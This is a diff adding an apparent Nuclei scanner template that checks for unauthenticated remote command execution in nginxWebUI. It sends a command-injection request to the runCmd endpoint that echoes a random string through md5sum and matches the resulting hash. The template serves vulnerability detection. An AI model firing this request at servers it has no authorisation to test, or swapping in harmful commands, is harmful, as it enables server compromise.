@@ -1,0 +1,31 @@
+id: nginxwebui-command-execution
+
+info:
+  name: nginxWebUI Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    nginxWebUI is a graphical management tool for nginx configuration. This vulnerability allows attackers to execute arbitrary commands on the server, potentially leading to backdoor installation and full server compromise.
+  reference:
+    - https://github.com/cym1102/nginxWebUI
+  tags: command-execution
+
+variables:
+  random_str: "{{rand_text_alphanumeric(5)}}"
+  random_str_md5: "{{md5(random_str)}}"
+
+http:
+  - raw:
+      - |
+        GET /AdminPage/conf/runCmd?cmd=echo%20-n%20%22{{random_str}}%22%20%7C%20md5sum HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_str_md5}}"
+        part: body
